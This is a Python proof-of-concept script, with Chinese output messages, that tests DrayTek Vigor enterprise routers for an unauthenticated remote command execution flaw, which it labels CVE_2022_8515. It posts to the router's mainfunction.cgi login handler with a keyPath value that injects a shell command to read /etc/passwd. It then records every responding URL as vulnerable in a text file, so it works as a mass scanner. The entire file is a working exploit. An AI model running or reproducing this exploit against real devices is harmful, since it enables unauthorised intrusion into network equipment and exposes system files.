import requests
def vigor_rce_poc(url):
    vuln_url = url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = "action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a"
    try:
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "root" in response.text and response.status_code == 200:
            print("-------------------------------\n【！！！！！！】存在CVE_2022_8515漏洞的url:" + url + "\n-------------------------------\n")
            with open ("存在DrayTek企业网络设备远程命令执行漏洞的url.txt", 'a+') as f:
                f.write(url + "\n")
            f.close()
        else:
            print("【×】不存在CVE_2022_8515漏洞:" + url + "\n")
    except Exception as e:
        pass